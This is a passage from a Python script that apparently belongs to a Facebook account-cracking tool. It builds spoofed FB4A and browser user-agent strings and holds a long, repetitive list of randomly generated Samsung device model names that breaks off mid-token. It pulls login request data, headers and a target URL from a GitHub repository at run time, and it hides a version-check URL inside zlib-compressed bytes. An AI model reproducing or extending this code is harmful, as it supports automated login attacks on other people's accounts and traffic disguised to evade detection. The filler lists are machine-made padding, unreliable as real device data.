_method_6_data = _method_6_buffer.getvalue().decode('utf-8').splitlines()
def mls6():
    END = ''.join(_method_6_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[NORMAL MTD]--------------------------------#
import requests,random

#--------------------------------[VERSION CHANGE]--------
try:
    version = requests.get(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\x0fK-*\xce\xcc\xcf\x03\t\x00\x00\xab\xe0\x1a\x00')).text
except:
    print('No Internet Connection.....');exit()
version = version.strip()
#-------------------------[RANDOM]--------
#-------------------------[METHOD 1 ]--------
try:
    DATAM1 = requests.get('https://raw.githubusercontent.com/Sumon8389/METHOD1/main/DATA.txt').text
except:
    print('No Internet Connection.....');exit()
DATAM1 = DATAM1.strip()
try:
    HEADERSM1 = requests.get('https://raw.githubusercontent.com/Sumon8389/METHOD1/main/HEADERS.txt').text
except:
    print('No Internet Connection.....');exit()
HEADERSM1 = HEADERSM1.strip()
try:
    URLM1 = requests.get('https://raw.githubusercontent.com/Sumon8389/METHOD1/main/URL.txt').text
except:
    print('No Internet Connection.....');exit()
URLM1 = URLM1.strip()
#----------------------------[USER/AGENT]-----------------------------------#
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.1020.40 Safari/537.36 Edg/95.0.1020.40",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.1054.62 Safari/537.36 Edg/96.0.1054.62",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97. 0.4692.71 Safari/537.36 Edg/97.0.4692.71",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 OPR/81.0.4196.31",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.58",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.27",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]

def get_random_user_agent():
    return random.choice(user_agents)


def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx

samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
samsung = ['GTH896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T;X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','G